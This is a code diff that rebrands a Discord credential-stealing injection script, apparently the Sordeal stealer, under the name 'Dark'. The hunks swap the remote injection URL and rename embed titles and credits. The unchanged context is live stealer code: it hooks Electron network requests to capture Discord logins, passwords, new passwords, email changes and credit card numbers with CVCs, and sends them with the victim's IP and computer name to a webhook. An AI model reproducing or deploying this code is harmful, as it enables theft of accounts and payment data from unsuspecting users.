@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 16711718,
 
-    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/DarkGamer12345/DarkGamer12345-Injection/main/index.js",
     webhook: "%WEBHOOK%",
     uwu: "https://panel.sordeal.net:3000/",
     Filter: {
@@ -264,7 +264,7 @@ const FirstTime = async () => {
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "Sordeal Initalized",
+            title: "Dark Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
@@ -285,7 +285,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "Sordeal Initalized",
+            title: "Dark Initalized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -320,7 +320,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                value: `[Dark 2023 <:sordeal:1087057809071427695>]`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -356,7 +356,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Sordealised User log out (User not Logged in before)",
+                title: "User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -377,7 +377,7 @@ const FirstTime = async () => {
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Sordeal Victim got logged out",
+                title: "Victim got logged out",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
@@ -412,7 +412,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                    value: `[Dark 2023 <:sordeal:1087057809071427695>]`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -550,8 +550,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Sordeal User Login",
-                description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
+                title: "User Login",
+                description: "[<:sordeal:1087057809071427695>  **Oh you got someone**]",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -587,7 +587,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                    value: `[Dark 2023 <:sordeal:1087057809071427695>]`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -631,8 +631,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Sordeal Detect Password Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
+                    title: "Dark Detect Password Changed",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you got someone**]",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -668,7 +668,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                        value: `[Dark 2023 <:sordeal:1087057809071427695>]`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -718,8 +718,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Sordeal Detect Email Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
+                    title: "Detect Email Changed",
+                    description: "[<:sordeal:1087057809071427695>]",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -755,7 +755,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                        value: `[Dark 2023 <:sordeal:1087057809071427695>])`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -804,7 +804,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "Sordeal User Credit Card Added",
+                title: "Dark User Credit Card Added",
                 description: `
                 **IP:** ${ip}\n\n
                 **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
